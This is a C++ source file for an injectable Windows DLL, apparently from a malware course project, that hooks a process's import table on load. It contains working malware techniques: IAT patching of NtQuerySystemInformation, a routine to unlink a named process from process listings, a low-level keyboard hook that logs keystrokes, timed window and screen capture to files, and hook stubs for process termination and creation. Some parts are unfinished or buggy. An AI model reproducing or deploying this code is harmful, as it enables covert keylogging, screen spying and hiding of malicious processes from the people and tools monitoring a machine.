#include "pch.h"
#include <string> 
#include <winternl.h>
#include <tchar.h>
#include <psapi.h>
#include "Logger.h"
#include <wincred.h>
#include <codecvt> // for std::wstring_convert
#include <unordered_map>
#include <sstream>
std::unordered_map<std::string, DWORD_PTR> functionDict;
std::wstring outPutPath= L"C:\\Users\\ISE\\source\\repos\\ChromeDll\\output.txt";
Logger logger(L"Desktop\\output2.txt"); // Create a global instance of the Logger class
std::wstring LastError;
HMODULE hModuleInjected;



PIMAGE_THUNK_DATA GetFirstThunk(HMODULE hModule, const CHAR* dllName, const CHAR* funcName) {
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDOSHeader->e_lfanew);

	// Get the import descriptor
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule +
		pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	CHAR* szModuleName;

	while (pImportDesc->Name != NULL) {
		szModuleName = (CHAR*)((BYTE*)hModule + pImportDesc->Name);
		if (strcmp(szModuleName, dllName) == 0) {
			break;
		}
		pImportDesc++;
	}

	if (pImportDesc->Name == NULL) {
		std::string message = std::string(dllName) + " did not found";
		logger.writeStr(message);
		return NULL;
	}
	PIMAGE_THUNK_DATA ChunkData = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc->OriginalFirstThunk);
	PIMAGE_THUNK_DATA FirstThunkData = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc->FirstThunk);
	PIMAGE_IMPORT_BY_NAME import;

	while (ChunkData->u1.Function != NULL) {
		if (ChunkData->u1.Ordinal & IMAGE_ORDINAL_FLAG) { // the function is by ordinal
			//std::cout << "This function by address" << std::endl;
		}
		else {
			import = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + ChunkData->u1.AddressOfData);
			if (strcmp(funcName, (const char*)import->Name) == 0) {
				//printf("%s\n", (const char*)import->Name);
				break;
			}
		}
		ChunkData++;
		FirstThunkData++;
	}
	if (pImportDesc->Name == NULL) {
		std::string message = std::string(funcName) + " did not found";
		logger.writeStr(message);
		return NULL;
	}
	
	return FirstThunkData;
}
DWORD_PTR getPointerFromDict(std::string keyToFind) {
	auto it = functionDict.find(keyToFind);
	if (it == functionDict.end()) {
		// Key not exists
		logger.write(L"Nt function didnt fount");
		return NULL;
	}
	return (it->second);
}
typedef NTSTATUS(WINAPI *MyNtQuerySystemInformationF)(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID SystemInformation,
	_In_      ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
	);


int WINAPI MyMessageBox(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) {
	logger.write(L"MessageBox was called");
	// Convert the HWND parameter to a string
	std::wstring hWndString = std::to_wstring((uintptr_t)(hWnd));

	// Write the parameters to the logger
	logger.write(L"HWND: " + hWndString);
	logger.write(L"lpText: " + std::wstring(lpText));
	logger.write(L"lpCaption: " + std::wstring(lpCaption));
	logger.write(L"uType: " + std::to_wstring(uType));

	// Call the original MessageBox function
	return 0;
}


//function sig must be like this int WINAPI MyMessageBox
void PatchIAT(HMODULE hModule ,const CHAR* dllName, const CHAR* funcName, DWORD_PTR newFunc) {
	if (hModule == NULL) {
		logger.write(L"Dnt file module");
	}
	logger.writeStr("Attack on dll" + std::string(dllName) + "with func" + std::string(funcName));

	PIMAGE_THUNK_DATA FirstThunkData = GetFirstThunk(hModule, dllName, funcName);
	if (FirstThunkData == NULL) {
		return;
	}
	//debug
	//typedef int(*FunctionType)(int);
	// Define a pointer type to my func
	//typedef int(WINAPI* MyMessageBoxPtr)(HWND, LPCWSTR, LPCWSTR, UINT);
	// Check the pointer
	//MyMessageBoxPtr f = (MyMessageBoxPtr)FirstThunkData->u1.Function;
	//f(NULL, L"Advanced topics in malware", L"IAT patch", MB_OK);

	MEMORY_BASIC_INFORMATION mbi;
	if (!VirtualQuery(FirstThunkData, &mbi, sizeof(mbi))) {
		// Failed to query memory information
		logger.write(L"Failed to query memory information");
	}

	DWORD oldProtect;
	// Change page to read-write-execute
	if (!VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		// Failed to change memory protection
		logger.write(L"Failed to change memory protection");
		return;
	}
	DWORD_PTR temp_func = (DWORD_PTR)FirstThunkData->u1.Function;
	
	// Modify the function pointer
	FirstThunkData->u1.Function = (DWORD_PTR)newFunc;
	// Return the old privilege to PIMAGE_THUNK_DATA
	if (!VirtualProtect(mbi.BaseAddress, mbi.RegionSize, oldProtect, &oldProtect)) {
		// Failed to restore memory protection
		logger.write(L"Failed to restore memory protection");
		return;
	}
	logger.writeStr(std::to_string(FirstThunkData->u1.Function));
	logger.writeStr(std::to_string(temp_func));
	functionDict[std::string(funcName)] = temp_func;
		// Successful attack
	logger.write(L"Attack done");
}

// Function to retrieve the HMODULE of the process to which the DLL is injected
extern "C" __declspec(dllexport) HMODULE GetInjectedModuleHandle() {
	// Get the handle to the current module (the DLL)
	HMODULE hModule = GetModuleHandle(NULL);
	if (hModule != NULL) {
		// Get the handle to the process (current process)
		HANDLE hProcess = GetCurrentProcess();
		if (hProcess != NULL) {
			// Get the module handle for the current process
			HMODULE hModules[1];
			DWORD cbNeeded;
			if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
				// Return the first module handle found (which should be the main module of the process)
				return hModules[0];

			}
		}
	}
	// Return NULL if unsuccessful
	return NULL;
}
HWND hWndThread;
BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
    DWORD processId;
    GetWindowThreadProcessId(hWnd, &processId);
	hWndThread = hWnd;
    // Check if the window belongs to the target process
    if (processId == GetCurrentProcessId()) {

        // Set the window text to the injected process name
        SetWindowText(hWnd, L"Injected Process");
        return FALSE; // Stop enumeration
    }

    return TRUE; // Continue enumeration
}

extern "C" __declspec(dllexport) void InjectedFunction() {
    // Enumerate all top-level windows to find the window of the injected process
    EnumWindows(EnumWindowsProc, 0);
}



std::wstring keystrokes;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	DWORD processId;
	GetWindowThreadProcessId(hWndThread, &processId);
	if  (processId == GetCurrentProcessId() && nCode == HC_ACTION)
	{
		KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;

		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
		{
			WCHAR ch;
			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);

			if (ToUnicode(pKbStruct->vkCode, pKbStruct->scanCode, keyboardState, &ch, 1, 0) == 1)
			{
				if (ch == L'\r') // Check if Enter key is pressed
				{
					logger.write(L"Keystrokes entered: " + keystrokes); // Log the keystrokes
					keystrokes.clear(); // Clear the keystrokes buffer
				}
				else if (ch == L'\b') // Check if Backspace key is pressed
				{
					if (!keystrokes.empty()) // Check if there is a character to delete
					{
						keystrokes.pop_back(); // Delete the last character
					}
				}
				else
				{
					keystrokes += ch; // Accumulate keystrokes
				}
			}
			break;
		}
		case WM_KEYUP:
		case WM_SYSKEYUP:
			break;
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


void debugProcesses(PSYSTEM_PROCESS_INFORMATION pProcessInfo) {
	PSYSTEM_PROCESS_INFORMATION pInfo = pProcessInfo;

	do {
		// Check if pInfo is null before dereferencing
		if (pInfo == nullptr) {
			break;
		}

		// Convert each value to string before printing
		std::wstring processIdStr = std::to_wstring(reinterpret_cast<ULONG_PTR>(pInfo->UniqueProcessId));
		std::wstring imageName = L"(unknown)";
		if (pInfo->ImageName.Buffer != nullptr) {
			imageName = pInfo->ImageName.Buffer;
		}

		std::wstring numberOfThreadsStr = std::to_wstring(pInfo->NumberOfThreads);

		// Print the converted values
		logger.write(L"Process ID: " + processIdStr);
		logger.write(L"  Image Name: " + imageName);
		logger.write(L"  Number of Threads: " + numberOfThreadsStr);


		// Get next process info
		if (pInfo->NextEntryOffset != 0) {
			pInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pInfo + pInfo->NextEntryOffset);
		}
		else {
			break; // Break loop if it's the last entry
		}
	} while (true);
}
#include <windows.h>
#include <iostream>
#include <string>
#include <winternl.h>

// Function to delete a process given its name
BOOL deleteProc(PSYSTEM_PROCESS_INFORMATION pProcessInfo, const std::wstring procToDel) {
	PSYSTEM_PROCESS_INFORMATION prevProcessInfo = NULL;
	PSYSTEM_PROCESS_INFORMATION currentProcessInfo = pProcessInfo;

	while (currentProcessInfo != NULL) {
		// Convert the process name to a std::wstring
		std::wstring processName(currentProcessInfo->ImageName.Buffer, currentProcessInfo->ImageName.Length / sizeof(WCHAR));

		// Check if the process name matches the one to delete
		if (processName.compare(procToDel) == 0) {
			logger.write(L"Process deleted");
			// Remove the process entry from the linked list
			if (prevProcessInfo != NULL) {
				prevProcessInfo->NextEntryOffset += currentProcessInfo->NextEntryOffset;
			}
			else {
				// If the first entry matches, update the head of the list
				pProcessInfo = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)currentProcessInfo + currentProcessInfo->NextEntryOffset);
			}
		}

		// Move to the next process information structure
		prevProcessInfo = currentProcessInfo;
		currentProcessInfo = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)currentProcessInfo + currentProcessInfo->NextEntryOffset);
	}
	logger.write(L"Done delete-----------------------------------------------------------------------------------------------------");
	// Process not found
	return FALSE;
}

NTSTATUS WINAPI MyNtQuerySystemInformation2(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID SystemInformation,
	_In_      ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
) {

	std::string keyToFind = "NtQuerySystemInformation";
	auto it = functionDict.find(keyToFind);
	if (it == functionDict.end()) {
		// Key not exists
		logger.write(L"Nt function didnt fount");
		return NULL;
	}
	MyNtQuerySystemInformationF originalFunction = (MyNtQuerySystemInformationF)(it->second);
	logger.write(L"call original NTqueryfunc");

	// Call the real NtQuerySystemInformation
	NTSTATUS status = originalFunction(
		SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	logger.write(L"done call original NTqueryfunc");


	if (!NT_SUCCESS(status)) {
		// If NtQuerySystemInformation fails or it's not SystemProcessInformation, return immediately
		logger.write(L"Fail in NtQuery");
		return status;
	}
	logger.write(L"Before---------------------------------------------");
	debugProcesses((PSYSTEM_PROCESS_INFORMATION)(SystemInformation));
	// Use memset to set all bytes to zero
	//memset(SystemInformation, 0, SystemInformationLength);
	debugProcesses((PSYSTEM_PROCESS_INFORMATION)(SystemInformation));
	logger.write(L"After----------------------------------------------");
}



// Define the function prototype for NtQuerySystemInformation
typedef NTSTATUS(WINAPI* pfnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)




// Function to capture the screenshot
void CaptureScreenshot(HWND hwnd, const wchar_t* filename) {
	// Get the dimensions of the window's client area
	RECT rc;
	GetClientRect(hwnd, &rc);

	// Create a compatible device context (DC)
	HDC hdcScreen = GetDC(hwnd);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, rc.right - rc.left, rc.bottom - rc.top);
	HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);

	// Copy the window's contents to the compatible DC
	PrintWindow(hwnd, hdcMem, 0);

	// Save the bitmap to a file
	BITMAPINFOHEADER bi;
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = rc.right - rc.left;
	bi.biHeight = rc.bottom - rc.top;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	// Create file and bitmap headers
	BITMAPFILEHEADER bmfh;
	bmfh.bfType = 0x4D42; // 'BM'
	bmfh.bfSize = (rc.right - rc.left) * (rc.bottom - rc.top) * 4 + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	bmfh.bfReserved1 = 0;
	bmfh.bfReserved2 = 0;
	bmfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	// Write headers to file
	HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWritten;
	WriteFile(hFile, &bmfh, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
	WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);

	// Write bitmap data to file
	BYTE* lpBits = new BYTE[(rc.right - rc.left) * (rc.bottom - rc.top) * 4];
	GetBitmapBits(hBitmap, (rc.right - rc.left) * (rc.bottom - rc.top) * 4, lpBits);
	WriteFile(hFile, lpBits, (rc.right - rc.left) * (rc.bottom - rc.top) * 4, &dwWritten, NULL);

	// Clean up
	CloseHandle(hFile);
	delete[] lpBits;
	SelectObject(hdcMem, hOldBitmap);
	DeleteObject(hBitmap);
	DeleteDC(hdcMem);
	ReleaseDC(hwnd, hdcScreen);
}

// Timer callback function
VOID CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
	// Capture screenshot of the window assigned to hWndThread
	if (hWndThread != nullptr) {
		CaptureScreenshot(hWndThread, L"C:\\Users\\ISE\\source\\repos\\ChromeDll\\screenshot.bmp");
		std::wcout << L"Screenshot captured successfully." << std::endl;
	}
	else {
		std::wcerr << L"No window found." << std::endl;
	}
}

// Function to set up the timer
void SetupTimer() {
	// Set up a timer to trigger every 10 seconds
	UINT_PTR timerId = SetTimer(NULL, 0, 10000, TimerProc);
	if (timerId == 0) {
		std::cerr << "Failed to set up the timer." << std::endl;
	}
}
BOOL myTerminateProcess(
	HANDLE hProcess,
	UINT   uExitCode
) {
	logger.write(L"terminate process");
	return TRUE;
}
// Function to capture the screen and save it to a file
void CaptureScreen2(const wchar_t* filename) {
	// Get the screen dimensions
	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);

	// Create a device context compatible with the screen
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);

	// Select the bitmap into the memory device context
	SelectObject(hdcMem, hBitmap);

	// Copy the screen contents into the bitmap
	BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

	// Save the bitmap to a file
	BITMAPINFOHEADER bi;
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = width;
	bi.biHeight = -height;  // Negative height to ensure top-down orientation
	bi.biPlanes = 1;
	bi.biBitCount = 24;     // 24-bit RGB
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	FILE* file;
	if (_wfopen_s(&file, filename, L"wb") == 0 && file != NULL) {
		BITMAPFILEHEADER bmfh;
		int dwBmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;

		// File header
		bmfh.bfType = 0x4D42;  // "BM"
		bmfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
		bmfh.bfReserved1 = 0;
		bmfh.bfReserved2 = 0;
		bmfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

		// Write the file header
		fwrite(&bmfh, sizeof(BITMAPFILEHEADER), 1, file);

		// Write the bitmap info header
		fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, file);

		// Write the bitmap data
		fwrite((LPBYTE)hBitmap, dwBmpSize, 1, file);

		// Clean up
		fclose(file);
	}

	// Clean up resources
	DeleteObject(hBitmap);
	DeleteDC(hdcMem);
	ReleaseDC(NULL, hdcScreen);
}

typedef NTSTATUS(NTAPI *PFN_NtCreateProcessEx)(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN HANDLE ParentProcessHandle,
	IN ULONG Flags,
	IN HANDLE SectionHandle OPTIONAL,
	IN HANDLE DebugPort OPTIONAL,
	IN HANDLE ExceptionPort OPTIONAL,
	IN BOOLEAN InJob
	);

NTSTATUS WINAPI myNtCreateProcessEx(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN HANDLE ParentProcessHandle,
	IN ULONG Flags,
	IN HANDLE SectionHandle OPTIONAL,
	IN HANDLE DebugPort OPTIONAL,
	IN HANDLE ExceptionPort OPTIONAL,
	IN BOOLEAN InJob
) {
	DWORD_PTR functPointer = getPointerFromDict("NtCreateProcessEx");
	if (functPointer == NULL) {
		logger.write(L"didnt found func");
	}
	return 0;
}




// Entry point function for the DLL
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	// Output a debug message indicating the DLL is loaded
	OutputDebugString(L"Loaded");
	logger.write(L"Starting injections...");
	// Handle different reasons for calling the DLLMain function

		if (ul_reason_for_call == DLL_PROCESS_ATTACH){

			EnumWindows(EnumWindowsProc, 0);
			hModuleInjected = GetInjectedModuleHandle();
			if (hModuleInjected != NULL) {

				logger.write(L"Starting injections...");
				char buffer[17];
				snprintf(buffer, sizeof(buffer), "%p", hModuleInjected);
				// Convert the HMODULE to a string
				std::string moduleHandleStr = std::string(buffer);

				//HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hModuleInjected, 0);
				//CaptureScreen2(L"C:\\Users\\ISE\\source\\repos\\ChromeDll\\screenshot.bmp");

				//if (hhkLowLevelKybd == NULL) {
				//	logger.write(L"KeyBoard hook was failed " + std::to_wstring(GetLastError()));
				//}
				// Display the message box
				TCHAR filePath[2048];
				GetModuleFileName(hModuleInjected, filePath, 2048);

				// Construct the message
				std::wstring message = L"Injected module handle retrieved successfully.\n\nModule Handle5: " + std::wstring(filePath);
				


				//PatchIAT(hModuleInjected, "USER32.dll", "MessageBoxW", (DWORD_PTR)MyMessageBox);
				//PatchIAT(hModule2, "USER32.dll", "SendKeyPress", (DWORD_PTR)mySendKeyPress);
				//PatchIAT(hModule2, "USER32.dll", "SendKeyPress", (DWORD_PTR)mySendKeyPress);
				//PatchIAT(hModule2, "USER32.dll", "PostMessage", (DWORD_PTR)myPostMessage);
				PatchIAT(hModuleInjected, "ntdll.dll", "NtQuerySystemInformation", (DWORD_PTR)MyNtQuerySystemInformation2);
				//PatchIAT(hModuleInjected, "kernel32.dll", "TerminateProcess", (DWORD_PTR)myTerminateProcess);
				
				//PatchIAT(hModuleInjected, "ntdll.dll", "ReadConsole", (DWORD_PTR)MyNtQuerySystemInformation);
				//MessageBox(NULL, message.c_str(), _T("Success"), MB_OK | MB_ICONINFORMATION);
				//typedef int(*FunctionType)(int);


				//DWORD_PTR Pf1 = GetFirstThunk(hModuleInjected, "ntdll.dll", "NtQuerySystemInformation")->u1.Function;
				//pfnNtQuerySystemInformation pNtQuerySystemInformation = (pfnNtQuerySystemInformation)(Pf1);
				
			
				// Define a pointer type to my func (test)
				//typedef int(WINAPI* MyMessageBoxPtr)(HWND, LPCWSTR, LPCWSTR, UINT);
				// Check the pointer
				//MyMessageBoxPtr f = (MyMessageBoxPtr)getPointerFromDict("MessageBoxW");
				//f(NULL, message.c_str(), L"Success", MB_OK | MB_ICONINFORMATION);
				//f(NULL, L"Advanced topics in malware", L"IAT patch", MB_OK);
				 // Convert pointers to strings
				// Convert pointers to wide strings
				
				//std::wstring strInjected = std::to_wstring(Pf1);

				//logger.write(strInjected);

				MessageBox(NULL, message.c_str(), L"Success", MB_OK | MB_ICONINFORMATION);

				
			}
			else {
				MessageBox(NULL, L"Failed to retrieve injected module handle.", L"Error", MB_OK | MB_ICONERROR);
			}

			// Output a debug message indicating DLL_PROCESS_ATTACH
			OutputDebugString(L"Attached dll");
			
			// Enumerate all top-level windows and call EnumWindowsProc for each window
			


		}
		else if (ul_reason_for_call == DLL_THREAD_ATTACH){
			logger.write(L"Deatach...");
			// No action needed for DLL_THREAD_ATTACH
		}
		else if (ul_reason_for_call == DLL_THREAD_DETACH) {
		}
		// No action needed for DLL_THREAD_DETACH

		else if (ul_reason_for_call == DLL_PROCESS_DETACH) {

		}
		// No action needed for DLL_PROCESS_DETACH
	return TRUE; // Return TRUE to indicate successful execution
}